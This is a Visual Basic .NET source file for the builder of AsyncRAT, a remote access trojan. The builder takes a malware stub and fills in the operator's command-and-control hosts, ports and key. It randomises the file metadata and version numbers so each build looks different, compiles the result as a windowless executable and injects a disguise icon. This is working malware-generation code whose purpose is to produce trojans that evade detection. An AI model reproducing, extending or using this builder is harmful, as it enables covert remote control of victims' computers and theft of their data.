﻿
Public Class Builder

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim Stub = My.Resources.Stub

        Try
            Dim o As New SaveFileDialog With {
            .Filter = ".exe (*.exe)|*.exe",
            .InitialDirectory = Application.StartupPath,
            .Title = "AsyncRAT Builder",
            .OverwritePrompt = False,
            .FileName = "AsyncRAT-Client"
            }
            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                Stub = Replace(Stub, "%HOSTS%", TextBox1.Text.Trim().Replace(",", ChrW(34) + "," + ChrW(34)))
                Stub = Replace(Stub, "123456789", TextBox2.Text)
                Stub = Replace(Stub, "%KEY%", Settings.KEY)

                Stub = Replace(Stub, "%Title%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
                Stub = Replace(Stub, "%Description%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
                Stub = Replace(Stub, "%Company%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
                Stub = Replace(Stub, "%Product%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
                Stub = Replace(Stub, "%Copyright%", Randomi(rand.Next(3, 6)) + " © " + Randomi(rand.Next(3, 10)))
                Stub = Replace(Stub, "%Trademark%", Randomi(rand.Next(3, 6)) + " " + Randomi(rand.Next(3, 10)))
                Stub = Replace(Stub, "%v1%", rand.Next(0, 10))
                Stub = Replace(Stub, "%v2%", rand.Next(0, 10))
                Stub = Replace(Stub, "%v3%", rand.Next(0, 10))
                Stub = Replace(Stub, "%v4%", rand.Next(0, 10))
                Stub = Replace(Stub, "%Guid%", Guid.NewGuid.ToString)
                Stub = Replace(Stub, "'%ASSEMBLY%", Nothing)

                Dim providerOptions = New Dictionary(Of String, String)
                providerOptions.Add("CompilerVersion", "v4.0")
                Dim CodeProvider As New VBCodeProvider(providerOptions)
                Dim Parameters As New CodeDom.Compiler.CompilerParameters
                Dim OP As String = " /target:winexe /platform:x86 /optimize+ /nowarn"
                With Parameters
                    .GenerateExecutable = True
                    .OutputAssembly = o.FileName
                    .CompilerOptions = OP
                    .IncludeDebugInformation = False
                    .ReferencedAssemblies.Add("System.Windows.Forms.dll")
                    .ReferencedAssemblies.Add("System.dll")
                    .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
                    .ReferencedAssemblies.Add("System.Management.dll")
                    .ReferencedAssemblies.Add("System.Drawing.dll")


                    Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Stub)
                    For Each uii As CodeDom.Compiler.CompilerError In Results.Errors
                        MsgBox(uii.ToString)
                        Exit Sub
                    Next

                    If PictureBox1.ImageLocation <> Nothing Then
                        IconChanger.InjectIcon(o.FileName, PictureBox1.ImageLocation)
                    End If

                    MsgBox("Done!", MsgBoxStyle.Information)
                    Me.Close()
                End With
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try

    End Sub

    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        TextBox2.Text = String.Join(",", Settings.Ports.ToList)
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = "*.ico (*.ico)| *.ico"
                .InitialDirectory = Application.StartupPath + "\Misc\Icons"
                .Title = "Select Icon"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                PictureBox1.ImageLocation = o.FileName
            Else
                PictureBox1.ImageLocation = Nothing
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try
    End Sub
End Class